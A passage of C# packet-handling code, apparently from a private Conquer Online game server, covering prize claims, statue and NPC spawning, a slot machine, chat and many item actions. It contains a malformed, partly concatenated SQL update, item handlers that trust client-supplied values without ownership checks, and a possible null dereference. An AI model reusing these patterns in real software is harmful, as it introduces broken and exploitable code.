                                {
                                    client.Prizes[id].itemprize.Invoke(client);
                                    client.Prizes[id].itemprize = null;
                                    break;
                                }
                            default:
                                Console.WriteLine("Unknown inbox Type:" + Type.ToString());
                                break;
                        }
                        client.Send(packet);
                        break;
                    }
                #endregion
                #region MentorPremio (1036)
                //case 1036:
                //    {
                //        switch (packet[4])
                //        {
                //            #region Send
                //            case 0:
                //                Writer.WriteUInt32((uint)client.PrizeExperience, 8, packet);
                //                Writer.WriteUInt32(client.PrizeHeavenBlessing, 12, packet);
                //                client.Send(packet);
                //                break;
                //            #endregion
                //            #region Claim Training Exp
                //            case 1:
                //                {
                //                    if (client.PrizeExperience > 0)
                //                    {
                //                        client.IncreaseExperience((ulong)(((double)client.PrizeExperience / 606) * client.ExpBall), false);
                //                        client.PrizeExperience = 0;
                //                        client.Send(packet);
                //                    }
                //                    break;
                //                }
                //            #endregion
                //            #region Claim Blessing Exp
                //            case 2:
                //                {
                //                    if (client.PrizeHeavenBlessing > 0)
                //                    {
                //                        client.AddBless(client.PrizeHeavenBlessing);
                //                        client.PrizeHeavenBlessing = 0;
                //                        client.Send(packet);
                //                    }
                //                    break;
                //                }
                //            #endregion

                //        }
                //        break;
                //    }
                #endregion
                #region MentorGain PrizePacket.
                case 1036:
                    {
                        PrizeClaimb prize = new PrizeClaimb(false);
                        prize.Deserialize(packet);
                        switch (prize.Type)
                        {
                            case 0:
                                {
                                    prize = new PrizeClaimb(true);
                                    prize.OnlineTrainingExper = client.Entity.OnlineTrainning;
                                    prize.HuntingExper = client.Entity.HuntingExp;
                                    prize.Send(client);
                                    break;
                                }
                            case 1:
                                {
                                    client.IncreaseExperience((ulong)(client.Entity.OnlineTrainning / 600.0 * client.ExpBall), false);
                                    client.Entity.OnlineTrainning = 0;
                                    prize = new PrizeClaimb(true);
                                    prize.Type = 0;
                                    prize.OnlineTrainingExper = client.Entity.OnlineTrainning;
                                    prize.HuntingExper = client.Entity.HuntingExp;
                                    prize.Send(client);
                                    client.Send(prize);
                                    break;
                                }
                            case 2:
                                {
                                    client.IncreaseExperience((ulong)(client.Entity.HuntingExp / 600.0 * client.ExpBall), false);
                                    client.Entity.HuntingExp = 0;
                                    prize = new PrizeClaimb(true);
                                    prize.HuntingExper = client.Entity.HuntingExp;
                                    prize.OnlineTrainingExper = client.Entity.OnlineTrainning;
                                    prize.Type = 0;
                                    prize.Send(client);
                                    client.Send(prize);
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region NpcSpawn (2030)
                case 2030:
                    {
                        if (client.Action != 2)
                            return;
                        NpcSpawn spawn = new NpcSpawn(false);
                        spawn.Deserialize(packet);
                        SobNpcSpawn Base = new SobNpcSpawn();
                        Base.Owner = client;
                        Base.UID = client.Map.EntityUIDCounter2.Next;
                        Base.Mesh = spawn.Mesh;
                        Base.MapID = client.Entity.MapID;
                        Base.X = spawn.X;
                        Base.Y = spawn.Y;

                        uint id = 0;
                        if (client.spwansitem != null)
                            id = client.spwansitem.ID;
                        if ((spawn.Mesh / 10) == 147)
                        {
                            uint UID = client.Entity.OnMoveNpc;
                            if (client.Guild != null || client.Account.State == Database.AccountTable.AccountState.GM)
                            {
                                if (client.AsMember != null && client.AsMember.Rank == Enums.GuildMemberRank.GuildLeader || client.Account.State == Database.AccountTable.AccountState.GM)
                                {
                                    if (client.Guild.Name != null && client.Guild.Name != "")
                                    {
                                        if (client.Guild.Name == Game.GuildWar.Pole.Name || client.Account.State == Database.AccountTable.AccountState.GM)
                                        {
                                            var getnpc = Database.GuildCondutors.GuildConductors[UID];
                                            ushort oldx = getnpc.npc.X;
                                            ushort oldy = getnpc.npc.Y;
                                            ushort oldmap = getnpc.npc.MapID;

                                            if (!Database.GuildCondutors.MoveNpc(getnpc.npc.UID, client.Entity.MapID, spawn.X, spawn.Y))
                                                client.Entity.SendSysMesage("Invalid New location ! or Invalid map, try again ");
                                            else
                                            {
                                                var removeoldnpc = new Network.GamePackets.Data(true) { UID = UID, ID = Network.GamePackets.Data.RemoveEntity };

                                                Kernel.SendWorldMessage(removeoldnpc, Program.Values, oldmap);
                                                // var dictionary = Kernel.GamePool.Values.Where((play) => play.Entity.MapID == oldmap && Kernel.GetDDistance(play.Entity.X, play.Entity.Y, oldx, oldy) <= 17);
                                                // foreach (var pclient in dictionary)
                                                //     pclient.Send(removeoldnpc);

                                                client.Map.RemoveNpc(getnpc.npc, true);

                                                var newmap = Kernel.Maps[client.Entity.MapID];
                                                newmap.AddNpc(getnpc.npc, true
                                                    );
                                                client.SendScreen(getnpc.npc.ToArray(), true);
                                            }
                                        }
                                        else
                                            client.Entity.SendSysMesage("Sorry, you guild not dominate the Guild War");

                                    }
                                    else
                                        client.Entity.SendSysMesage("Sorry, you guild not dominate the Guild War");
                                }
                                else
                                    client.Entity.SendSysMesage("Sorry, you guild not dominate the Guild War");

                            }
                            else
                                client.Entity.SendSysMesage("Sorry, you guild not dominate the Guild War");

                        }
                        else if (client.Entity.MapID == 1038)
                        {

                            byte[] _buffer = new byte[client.Entity.SpawnPacket.Length];
                            Buffer.BlockCopy(client.Entity.SpawnPacket, 0, _buffer, 0, client.Entity.SpawnPacket.Length);
                            Base.SpawnPacket = _buffer;
                            Base.Type = spawn.Type;
                            Base.ShowName = true;
                            Base.Name = client.Entity.Name;
                            Base.Hitpoints = Base.MaxHitpoints = 2000000;
                            if (!client.Map.Statues.ContainsKey(Base.UID))
                                client.Map.Statues.Add(Base.UID, Base);
                            if (!client.Map.Npcs.ContainsKey(Base.UID))
                                client.Map.Npcs.Add(Base.UID, Base);

                            #region Save statue
                            using (var cmd = new Database.MySqlCommand(Database.MySqlCommandType.INSERT).Insert("statues")
                                          .Insert("id", Base.UID).Insert("lookface", Base.Mesh)
                                          .Insert("type", (byte)Base.Type).Insert("cellx", Base.X).Insert("celly", Base.Y)
                                          .Insert("mapid", Base.MapID).Insert("name", Base.Name)
                                          .Insert("life", Base.Hitpoints).Insert("maxlife", Base.MaxHitpoints))
                                cmd.Execute();

                            MemoryStream stream = new MemoryStream();
                            BinaryWriter writer = new BinaryWriter(stream);
                            writer.Write(Base.SpawnPacket);
                            string SQL = "UPDATE `statues` SET SpawnPacket=@SpawnPacket, where UID = " + Base.UID + " ;";
                            byte[] rawData = stream.ToArray();
                            using (var conn = Database.DataHolder.MySqlConnection)
                            {
                                conn.Open();
                                using (var cmd = new MySql.Data.MySqlClient.MySqlCommand())
                                {
                                    cmd.Connection = conn;
                                    cmd.CommandText = SQL;
                                    cmd.Parameters.AddWithValue("@SpawnPacket", rawData);
                                    cmd.ExecuteNonQuery();
                                }
                            }

                            #endregion

                        }
                        else if (MaTrix.House.Houses.ContainsKey(client.Entity.UID))
                        {
                            if ((spawn.Mesh / 10) == 820)
                                Base.Type = (Enums.NpcType)2;
                            else
                                Base.Type = (Enums.NpcType)26;
                            // client.Map.AddNpc(Base);
                            var itembox = MaTrix.House.CheckItemBox(client, MaTrix.House.Houses[client.Entity.UID]);
                            if (itembox != null)
                            {
                                client.MessageBox("You already Have ItemBox in your House");
                                return;
                            }

                            do
                            {
                                Base.UID = client.Map.EntityUIDCounter2.Next;
                            }
                            while (MaTrix.House.Houses[client.Entity.UID].Furnitures.ContainsKey(Base.UID));

                            MaTrix.House.Houses[client.Entity.UID].Furnitures.Add(Base.UID, Base);
                            MaTrix.House.SaveFurnitures(client);

                        }
                        if (client.Entity.MapID != 1038)
                            client.Inventory.Remove(client.spwansitem, Enums.ItemUse.Remove);
                        client.SendScreenSpawn(Base, true);
                        break;
                    }
                #endregion
                #region Skill Soul
                case 1103:
                    {
                        Spell spell = new Spell(false);
                        spell.Deserialize(packet);
                        if (!client.Spells.ContainsKey(spell.ID))
                            return;
                        switch (packet[18])
                        {
                            #region Remove Skill
                            case 5://Remove
                                {
                                    Spell.Soul_Level remove = Spell.SkillSoul_values[(int)packet[20]];
                                    if (client.Spells[spell.ID].ContainsFlag(remove))
                                    {
                                        client.Spells[spell.ID].RemoveFlag(remove);
                                        Network.GamePackets.Data data = new Data(true);
                                        data.UID = client.Entity.UID;
                                        data.dwParam = client.Spells[spell.ID].ID;
                                        data.ID = 109;
                                        client.Send(data);
                                        client.Send(new Spell(true)
                                        {
                                            ID = client.Spells[spell.ID].ID,
                                            Level = client.Spells[spell.ID].Level,
                                            PreviousLevel = client.Spells[spell.ID].PreviousLevel,
                                            Experience = 0,
                                            Souls = client.Spells[spell.ID].Souls,
                                            Available = true
                                        }.ToArray());
                                        client.Spells[spell.ID].Send(client);
                                        MTA.Database.SkillTable.SaveSpells(client);
                                    }
                                    break;
                                }
                            #endregion
                            case 2:
                                {
                                    switch (packet[20])
                                    {
                                        case 1:
                                        case 8: client.Spells[spell.ID].LevelHu2 = 1; break;
                                        case 2:
                                        case 16: client.Spells[spell.ID].LevelHu2 = 2; break;
                                        case 3:
                                        case 24: client.Spells[spell.ID].LevelHu2 = 3; break;
                                        case 4:
                                        case 32: client.Spells[spell.ID].LevelHu2 = 4; break;
                                        default:
                                            {
                                                client.Spells[spell.ID].LevelHu2 = packet[20];
                                            }
                                            break;
                                    }
                                    break;
                                }
                        }
                        packet[18] = 3;
                        client.Send(packet);
                        break;
                    }
                #endregion Skill Soul
                #region CurrentLocation
                case 0x97E:
                    {
                        //if (CrossServer.IsWar == true)
                        //{
                        //    client.Entity.SendSysMesage("You can't change your flag while CrossServerCTF running");
                        //    break;
                        //}
                        CurrentLocationPacket cur = new CurrentLocationPacket(packet);
                        client.Entity.CountryID = cur.CountryID;
                        cur.HeroID = client.Entity.UID;
                        client.SendScreen(cur, true);
                        break;
                    }
                #endregion
                #region One Armed Bandit (1351 + 1352)
                case 1351:
                    {
                        SlotMachineRequest req = new SlotMachineRequest();
                        req.Deserialize(packet);
                        switch (req.Mode)
                        {
                            case SlotMachineSubType.StartSpin:
                                {
                                    if (client.SMSpinCount >= 10)
                                    {
                                        Npcs dialog = new Npcs(client);
                                        client.ActiveNpc = 9999998;
                                        client.SMCaptcha = client.GenerateCaptcha(5);
                                        client.SMPacket = packet;
                                        dialog.Text("You have spun the wheel 10 times. Input the current text: " + client.SMCaptcha + " to verify your humanity.");
                                        dialog.Input("Captcha message:", 1, (byte)client.SMCaptcha.Length);
                                        dialog.Option("No thank you.", 255);
                                        dialog.Send();
                                        return;
                                    }
                                    client.SMSpinCount++;
                                    INpc npc = null;
                                    client.Screen.TryGetNpc(req.NpcID, out npc);
                                    if (npc != null)
                                    {
                                        if (npc.Mesh / 10 >= 1977 && npc.Mesh / 10 <= 1980)
                                        {
                                            int id = npc.Mesh / 10 - 1977;
                                            uint cost = 10000;
                                            bool cps = id != 0;
                                            if (id == 1) cost = 3;
                                            if (id == 2) cost = 10;
                                            if (id == 3) cost = 100;
                                            cost *= req.BetMultiplier;
                                            if ((cps && client.Entity.ConquerPoints >= cost) || (!cps && client.Entity.Money >= cost))
                                            {
                                                if (cps) client.Entity.ConquerPoints -= cost;
                                                else client.Entity.Money -= cost;
                                                client.SlotMachine = new Game.ConquerStructures.SlotMachine(req.NpcID, cost, cps);
                                                client.SlotMachine.SpinTheWheels();
                                                client.SlotMachine.SendWheelsToClient(client);
                                            }
                                        }
                                    }
                                    break;
                                }
                            case SlotMachineSubType.ClientFinishSpin:
                                {
                                    if (client.SlotMachine != null)
                                    {
                                        uint reward = client.SlotMachine.GetRewardAmount(client);
                                        if (client.SlotMachine.Cps) client.Entity.ConquerPoints += reward;
                                        else client.Entity.Money += reward;
                                        client.Send(new SlotMachineResponse() { NpcID = req.NpcID, Mode = SlotMachineSubType.StopSpin });
                                        client.SlotMachine = null;
                                    }
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region EnitityCreate (1001)
                case 1001:
                    {
                        if (client.Action == 1)
                        {
                            EnitityCreate EC = new EnitityCreate();
                            EC.Deserialize(packet);
                            if (EC.Name.Contains("~"))
                            {
                                client.Send(new Message("Chose a name without '~'!", "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.PopUP));
                                return;
                            }
                            EC.Name = EC.Name.Remove("pm").Remove("gm").Remove("owner").Remove("owwner").Remove("~").Remove("¶").Remove("");
                            string Message = "";
                            Boolean Created = Database.EntityTable.CreateEntity(EC, client, ref Message);
                            if (Created)
                            {
                                client.JustCreated = true;
                                client.Send(new Message(Message, "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.PopUP));
                            }
                            else
                            {
                                client.Send(new Message(Message, "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.PopUP));
                            }
                        }
                        break;
                    }
                #endregion
                #region Chat/Message (1004)
                case 1004:
                    {
                        if (client.Action != 2)
                            return;
                        Message message = new Message();
                        message.Deserialize(packet);
                        message.__Message = Filter(message.__Message, client);
                        if (message.__Message.Split(new string[] { "\\n" }, StringSplitOptions.RemoveEmptyEntries).Length > 0)
                            message.__Message = message.__Message.Split(new string[] { "\\n" }, StringSplitOptions.RemoveEmptyEntries)[0];
                        Chat(message, client);
                        break;
                    }
                #endregion
                #region Item/Ping (1009)
                case 1009:
                    {
                        if (client.Action != 2)
                            return;
                        ItemUsage usage = new ItemUsage(false);
                        usage.Deserialize(packet);
                        if (!client.Entity.Dead || usage.ID == ItemUsage.Ping)
                        {
                            switch (usage.ID)
                            {
                                case 56://sash
                                    {
                                        if (client.SashSlots < 200)
                                        {
                                            var item = Database.ConquerItemTable.LoadItem(usage.UID);
                                            uint slots = 0;
                                            switch (item.ID)
                                            {
                                                case 1100003:
                                                    slots = 3;
                                                    break;
                                                case 1100006:
                                                    slots = 6;
                                                    break;
                                                case 1100009:
                                                    slots = 12;
                                                    break;
                                            }
                                            client.SashSlots += slots;
                                            //if (client.Warehouses.ContainsKey((MTA.Game.ConquerStructures.Warehouse.WarehouseID)item.UID))
                                            //{
                                            //    var sash = client.Warehouses[(MTA.Game.ConquerStructures.Warehouse.WarehouseID)item.UID];                                            
                                            //    if (!client.Warehouses.ContainsKey((MTA.Game.ConquerStructures.Warehouse.WarehouseID)client.Entity.UID))
                                            //        client.Warehouses.Add((Game.ConquerStructures.Warehouse.WarehouseID)client.Entity.UID, new Game.ConquerStructures.Warehouse(client, (Game.ConquerStructures.Warehouse.WarehouseID)client.Entity.UID));

                                            //    var invsash = client.Warehouses[(MTA.Game.ConquerStructures.Warehouse.WarehouseID)client.Entity.UID];

                                            //    foreach (var whitem in sash.Objects)
                                            //    {
                                            //        whitem.Warehouse = client.Entity.UID;
                                            //        whitem.Position = 0;
                                            //    }                                            
                                            //}
                                            client.Inventory.Remove(item, Enums.ItemUse.Remove);
                                        }
                                        else
                                        {
                                            client.Entity.SendSysMesage("you already opened max number of slots");
                                        }
                                        break;
                                    }
                                case 53:
                                    {
                                        uint ItemAdd = BitConverter.ToUInt32(packet, 12);// ay offset akbr mn 12 htzwdo 4
                                        //:))) that npc is maked by me

                                        ConquerItem item_new = null;
                                        if (client.Inventory.TryGetItem(ItemAdd, out item_new))
                                        {
                                            uint obtined_points = 0;
                                            Database.ConquerItemInformation iteminfo = new MTA.Database.ConquerItemInformation(ItemAdd, 0);
                                            Dictionary<uint, uint> amount = new Dictionary<uint, uint>();//packet[20]);
                                            for (ushort i = 88; i < 88 + 4 * packet[24]; i += 4)
                                            {
                                                uint item_swap = BitConverter.ToUInt32(packet, i);
                                                if (client.Inventory.ContainsUID(item_swap))
                                                {
                                                    ConquerItem item = null;
                                                    if (client.Inventory.TryGetItem(item_swap, out item))
                                                    {
                                                        amount.Add(item_swap, i);
                                                    }
                                                    switch (item.ID)
                                                    {
                                                        case 191505:
                                                        case 191605:
                                                        case 191705:
                                                        case 191805:
                                                        case 191905:
                                                        case 191405:
                                                        case 183325:
                                                        case 183315:
                                                        case 183375:
                                                        case 183305:
                                                            {
                                                                obtined_points += 300;
                                                                break;
                                                            }
                                                        default:
                                                            obtined_points += 50;
                                                            break;
                                                    }
                                                }
                                            }
                                            if (iteminfo.BaseInformation.ConquerPointsWorth > obtined_points)
                                            {
                                                uint add_cps = 0;
                                                add_cps = (uint)(iteminfo.BaseInformation.ConquerPointsWorth - obtined_points);
                                                if (add_cps < client.Entity.ConquerPoints)
                                                {
                                                    client.Entity.ConquerPoints -= (uint)add_cps;
                                                    foreach (uint key in amount.Keys)
                                                    {
                                                        if (client.Inventory.ContainsUID(key))
                                                            client.Inventory.Remove(key, MTA.Game.Enums.ItemUse.Remove, true);
                                                    }
                                                    client.Inventory.Add(ItemAdd, 0, 1);

                                                }
                                            }
                                            else
                                            {
                                                foreach (uint key in amount.Keys)
                                                {
                                                    if (client.Inventory.ContainsUID(key))
                                                        client.Inventory.Remove(key, MTA.Game.Enums.ItemUse.Remove, true);
                                                }
                                                client.Inventory.Add(ItemAdd, 0, 1);

                                            }
                                        }
                                        break;
                                    }
                                case ItemUsage.MainEquipment:
                                case ItemUsage.AlternateEquipment:
                                    {
                                        if (client.Entity.ContainsFlag3(Update.Flags3.Assassin))
                                        {
                                            client.Send(new Message("You cannot switch between equipments while being an assasin!",
                                                Color.Red, Message.Agate));
                                            return;
                                        }
                                        SwitchEquipment(client, usage.ID == ItemUsage.AlternateEquipment);
                                        client.Send(new ClientEquip(client));
                                        break;
                                    }
                                case 52:
                                    {
                                        var item = Database.ConquerItemTable.LoadItem(usage.UID);
                                        Database.ConquerItemTable.HandleInscribing(item, client);
                                        Database.ItemAddingTable.GetAddingsForItem(item);
                                        item.Mode = MTA.Game.Enums.ItemMode.ChatItem;
                                        item.Send(client);
                                        break;
                                    }
                                case 41:
                                    {
                                        // var item = Database.ConquerItemTable.LoadItem(usage.UID);

                                        ConquerItem item = new ConquerItem(true);
                                        if (client.Inventory.TryGetItem(usage.UID, out item))
                                        {
                                            var infos = new MTA.Database.ConquerItemInformation(item.ID, 0);
                                            item.UID = usage.UID;
                                            item.DayStamp = DateTime.Now;
                                            item.Days = (byte)(infos.BaseInformation.Time == 0 ? 7 : (infos.BaseInformation.Time / 24 / 60));
                                            TimeSpan Remain = item.DayStamp.AddDays(item.Days) - DateTime.Now;
                                            item.TimeLeftInMinutes = (uint)Remain.TotalSeconds;
                                            Database.ConquerItemTable.Update_Free(item, client);
                                            usage.dwParam = 5;
                                            client.Send(usage);
                                        }
                                        break;
                                    }
                                case ItemUsage.FrankoReload:
                                    {
                                        lock (client.ItemSyncRoot)
                                            //   ReloadFrankos(client.Equipment.TryGetItem(ConquerItem.LeftWeapon), client);
                                            break;
                                    }
                                case ItemUsage.ShowBoothItems:
                                    {
                                        lock (client.ItemSyncRoot)
                                            ShowBoothItems(usage, client);
                                        break;
                                    }
                                case ItemUsage.AddItemOnBoothForSilvers:
                                case ItemUsage.AddItemOnBoothForConquerPoints:
                                    {
                                        lock (client.ItemSyncRoot)
                                            AddItemOnBooth(usage, client);
                                        break;
                                    }
                                case ItemUsage.BuyFromBooth:
                                    {

                                        lock (client.ItemSyncRoot)
                                            BuyFromBooth(usage, client);
                                        break;
                                    }
                                case ItemUsage.RemoveItemFromBooth:
                                    {
                                        lock (client.ItemSyncRoot)
                                            RemoveItemFromBooth(usage, client);
                                        break;
                                    }
                                case ItemUsage.EquipItem:
                                    {
                                        lock (client.ItemSyncRoot)
                                            EquipItem(usage, client);
                                        client.Send(WindowStats(client));
                                        break;
                                    }
                                case ItemUsage.UnequipItem:
                                    {
                                        lock (client.ItemSyncRoot)
                                            UnequipItem(usage, client);
                                        client.Equipment.UpdateEntityPacket();
                                        client.Send(WindowStats(client));
                                        break;
                                    }
                                case 55:
                                case ItemUsage.BuyFromNPC:
                                    {

                                        lock (client.ItemSyncRoot)
                                            HandleBuyFromNPC(usage, client);
                                        break;
                                    }
                                case ItemUsage.SellToNPC:
                                    {
                                        lock (client.ItemSyncRoot)
                                            HandleSellToNPC(usage, client);
                                        break;
                                    }

                                case ItemUsage.VIPRepair:
                                    {
                                        HandleVIPRepair(usage, client);
                                        break;
                                    }
                                case ItemUsage.Repair:
                                    {
                                        lock (client.ItemSyncRoot)
                                            HandleRepair(usage, client);
                                        break;
                                    }
                                case ItemUsage.MeteorUpgrade:
                                case ItemUsage.DragonBallUpgrade:
                                    {
                                        UpgradeItem(usage, client);
                                        break;
                                    }
                                case ItemUsage.Ping:
                                    {
                                        client.Send(usage);
                                        break;
                                    }
                                case ItemUsage.ViewWarehouse:
                                    {
                                        usage.dwParam = (uint)client.MoneySave;
                                        client.Send(usage);
                                        break;
                                    }
                                case ItemUsage.WarehouseDeposit:
                                    {
                                        if (client.Entity.Money >= usage.dwParam)
                                        {
                                            client.Entity.Money -= usage.dwParam;
                                            client.MoneySave += usage.dwParam;
                                        }
                                        break;
                                    }
                                case ItemUsage.WarehouseWithdraw:
                                    {
                                        if (client.MoneySave >= usage.dwParam)
                                        {
                                            client.Entity.Money += usage.dwParam;
                                            client.MoneySave -= usage.dwParam;
                                        }
                                        break;
                                    }
                                case ItemUsage.DropItem:
                                    {
                                        DropItem(usage, client);
                                        break;
                                    }
                                case ItemUsage.DropMoney:
                                    {
                                        DropMoney(usage, client);
                                        break;
                                    }
                                case ItemUsage.Enchant:
                                    {
                                        EnchantItem(usage, client);
                                        break;
                                    }
                                case ItemUsage.SocketTalismanWithItem:
                                    {
                                        for (int i = 0; i < usage.dwExtraInfo; i++)
                                        {
                                            usage.dwParam = BitConverter.ToUInt32(packet, 91 + 4 * i);
                                            SocketTalismanWithItem(usage, client);
                                        }
                                        break;
                                    }
                                case ItemUsage.SocketTalismanWithCPs:
                                    {
                                        SocketTalismanWithCPs(usage, client);
                                        break;
                                    }
                                case ItemUsage.RedeemGear:
                                    {
                                        var item = client.DeatinedItem[usage.UID];
                                        if (item != null)
                                        {
                                            if (DateTime.Now > item.Date.AddDays(7))
                                            {
                                                client.Send(new Message("This item is expired!", System.Drawing.Color.Red, Message.TopLeft));

                                                return;
                                            }
                                            if (client.Entity.ConquerPoints >= item.ConquerPointsCost && client.Inventory.Count < 40)
                                            {
                                                client.Entity.ConquerPoints -= item.ConquerPointsCost;
                                                Database.EntityTable.UpdateCps(client);

                                                usage.dwParam = client.Entity.UID;
                                                usage.dwExtraInfo3 = item.ConquerPointsCost;
                                                client.Send(usage);

                                                client.Inventory.Add(item.Item, MTA.Game.Enums.ItemUse.Add);

                                                item.Item.Mode = Enums.ItemMode.Update;
                                                item.Item.Send(client);

                                                Database.ClaimItemTable.Redeem(item, client);
                                                Database.DetainedItemTable.Claim(item, client);
                                                client.DeatinedItem.Remove(item.UID);

                                                if (Kernel.GamePool.ContainsKey(item.GainerUID))
                                                {
                                                    GameState pClient;
                                                    if (Kernel.GamePool.TryGetValue(item.GainerUID, out pClient))
                                                    {
                                                        if (pClient.Entity != null && pClient != null && pClient.ClaimableItem != null)
                                                        {
                                                            pClient.ClaimableItem[item.UID].OwnerUID = 500;
                                                            pClient.ClaimableItem[item.UID].MakeItReadyToClaim();
                                                            usage.dwParam = pClient.Entity.UID;
                                                            usage.ID = ItemUsage.ClaimGear;
                                                            pClient.Send(usage);
                                                            pClient.ClaimableItem[item.UID].Send(pClient);
                                                        }
                                                    }
                                                }

                                                Message message = new Message(" " + client.Entity.Name + " has redeemed his Gear and Pay " + item.ConquerPointsCost + " CPS . Congratulations!", System.Drawing.Color.Wheat, Message.Talk);
                                                Kernel.SendWorldMessage(message, Program.Values);
                                            }
                                        }
                                        else
                                        {
                                            client.Send(new Message("The item you want to redeem has already been redeemed.", System.Drawing.Color.Red, Message.TopLeft));
                                        }
                                        break;
                                    }
                                case ItemUsage.ClaimGear:
                                    {
                                        if (client.Inventory.Count < 40)
                                        {
                                            var item = client.ClaimableItem[usage.UID];
                                            if (item != null)
                                            {
                                                if (item.Bound && item.OwnerUID != 500)
                                                {
                                                    if (DateTime.Now >= item.Date.AddDays(7))
                                                    {
                                                        Database.ClaimItemTable.Claim(item, client);
                                                        client.ClaimableItem.Remove(item.UID);

                                                        usage.dwParam = client.Entity.UID;
                                                        usage.dwExtraInfo3 = item.ConquerPointsCost;
                                                        client.Send(usage);
                                                    }
                                                    client.Send(new Message("Unnclaimable item!", System.Drawing.Color.Red, Message.TopLeft));
                                                    return;
                                                }
                                                if (DateTime.Now < item.Date.AddDays(7) && item.OwnerUID != 500)
                                                {
                                                    client.Send(new Message("This item is not expired. You cannot claim it yet!", System.Drawing.Color.Red, Message.TopLeft));
                                                    return;
                                                }
                                                if (item.OwnerUID == 500)
                                                    client.Entity.ConquerPoints += item.ConquerPointsCost;
                                                else
                                                {
                                                    client.Inventory.Add(item.Item, MTA.Game.Enums.ItemUse.Move);
                                                    Message message = new Message("Thank you for arresting " + item.OwnerName + " , " + item.GainerName + ". The arrested one has redeemed his items and you have received a great deal of ConquerPoints as reward. Congratulations!", System.Drawing.Color.Wheat, Message.Talk);
                                                    Kernel.SendWorldMessage(message, Program.Values);
                                                }
                                                Database.ClaimItemTable.Claim(item, client);
                                                client.ClaimableItem.Remove(item.UID);

                                                usage.dwParam = client.Entity.UID;
                                                usage.dwExtraInfo3 = item.ConquerPointsCost;
                                                //Database.EntityTable.UpdateCps(client);
                                                client.Send(usage);
                                                Message message2 = new Message("Thank you for arresting red/black name players " + client.Entity.Name + " has recived " + item.ConquerPointsCost + " CPS . Congratulations!", System.Drawing.Color.Wheat, Message.Talk);
                                                Kernel.SendWorldMessage(message2, Program.Values);
                                            }
                                            else
                                            {
                                                client.Send(new Message("The item you want to claim has already been claimed.", System.Drawing.Color.Red, Message.TopLeft));
                                            }
                                        }
                                        break;
                                    }
                                case ItemUsage.SocketerMan:
                                    {
                                        SocketItem(usage, client);
                                        client.Send(packet);
                                        break;
                                    }
                                case 40:
                                    {
                                        uint ItemAdd = BitConverter.ToUInt32(packet, 8);

                                        ConquerItem item_new = null;
                                        if (client.Inventory.TryGetItem(ItemAdd, out item_new))
                                        {
                                            var itemtype = item_new.GetItemType();
                                            if (itemtype == ConquerItem.ItemTypes.GemID)
                                                return;
                                            ushort pos = ItemPosition(item_new.ID);
                                            if (pos == ConquerItem.Bottle || pos == ConquerItem.Wing || pos == ConquerItem.Fan || pos == ConquerItem.Garment || pos == ConquerItem.LeftWeaponAccessory || pos == ConquerItem.RightWeaponAccessory || pos == ConquerItem.Steed || pos == ConquerItem.SteedArmor || pos == ConquerItem.SteedCrop || pos == ConquerItem.Tower)
                                            {
                                                client.Send(new Message("Sorry can't bless this item !", System.Drawing.Color.Red, Message.Talk));
                                                return;
                                            }
                                            if (item_new.Bless >= 7)
                                                return;
                                            Queue<uint> amount = new Queue<uint>(packet[24]);

                                            for (ushort i = 91; i < 91 + 4 * usage.dwExtraInfo; i += 4)
                                            {
                                                uint uid = BitConverter.ToUInt32(packet, i);
                                                if (client.Inventory.ContainsUID(uid))
                                                    amount.Enqueue(uid);
                                                else
                                                    return;
                                            }
                                            byte oldbless = item_new.Bless;
                                            if (item_new.Bless == 0 && amount.Count == 5)
                                                item_new.Bless = 1;
                                            else if (item_new.Bless == 1 && amount.Count == 1)
                                                item_new.Bless = 3;
                                            else if (item_new.Bless == 3 && amount.Count == 3)
                                                item_new.Bless = 5;
                                            else if (item_new.Bless == 5 && amount.Count == 5)
                                                item_new.Bless = 7;
                                            if (oldbless == item_new.Bless)
                                                return;

                                            while (amount.Count != 0)
                                                client.Inventory.Remove(amount.Dequeue(), MTA.Game.Enums.ItemUse.Remove, true);

                                            item_new.Mode = MTA.Game.Enums.ItemMode.Update;
                                            item_new.Send(client);
                                            usage.dwParam = 1;
                                            Database.ConquerItemTable.UpdateBless(item_new);
                                        }
                                        client.Send(packet);
                                        break;
                                    }
                                case ItemUsage.GemCompose:
                                    {
                                        #region GemCompose
                                        UInt32 Ident = usage.UID;
                                        client.Inventory.Remove(Ident, 15);
                                        client.Inventory.Add(Ident + 1, 0, 1);
                                        usage.dwParam = 1;
                                        client.Send(usage);
                                        #endregion
                                        break;
                                    }
                                case ItemUsage.ToristSuper:
                                    {
                                        #region GemCompose
                                        if (client.Entity.Money >= 100000)
                                        {
                                            client.Inventory.Remove(700002, 1);
                                            client.Inventory.Remove(700012, 1);
                                            client.Inventory.Remove(700022, 1);
                                            client.Inventory.Remove(700032, 1);
                                            client.Inventory.Remove(700042, 1);
                                            client.Inventory.Remove(700052, 1);
                                            client.Inventory.Remove(700062, 1);
                                            client.Entity.Money -= 100000;
                                            client.Inventory.Add(700072, 0, 1);
                                            client.Send(usage);
                                            usage.dwParam = 1;
                                        }
                                        else
                                        {
                                            client.Send(new Message("Sorry you don`t have 100,000 silver!.", System.Drawing.Color.Red, Message.Talk));
                                        }
                                        #endregion
                                        break;
                                    }
                                case ItemUsage.SplitStack:
                                    {
                                        ConquerItem mainItem = null;
                                        ConquerItem minorItem = new ConquerItem(true);
                                        Database.ConquerItemInformation infos = null;
                                        minorItem.Color = (MTA.Game.Enums.Color)Kernel.Random.Next(4, 8);
                                        if (client.Inventory.TryGetItem(usage.UID, out mainItem))
                                        {
                                            infos = new MTA.Database.ConquerItemInformation(mainItem.ID, 0);
                                            if (mainItem.StackSize > 1 && mainItem.StackSize <= infos.BaseInformation.StackSize)
                                            {
                                                if (client.Inventory.Count < 40)
                                                {
                                                    if (usage.dwParam < mainItem.StackSize)
                                                    {
                                                        ushort Amount = (ushort)usage.dwParam;
                                                        mainItem.StackSize -= Amount;
                                                        mainItem.Mode = Game.Enums.ItemMode.Update;
                                                        mainItem.Send(client);
                                                        mainItem.Mode = Game.Enums.ItemMode.Default;
                                                        minorItem.ID = mainItem.ID;
                                                        minorItem.StackSize += Amount;
                                                        minorItem.Durability = mainItem.Durability;
                                                        client.Inventory.Add(minorItem, Game.Enums.ItemUse.CreateAndAdd);
                                                        Database.ConquerItemTable.UpdateStack(mainItem);
                                                    }
                                                }
                                            }
                                        }
                                        break;
                                    }
                                case ItemUsage.MergeStackableItems:
                                    {
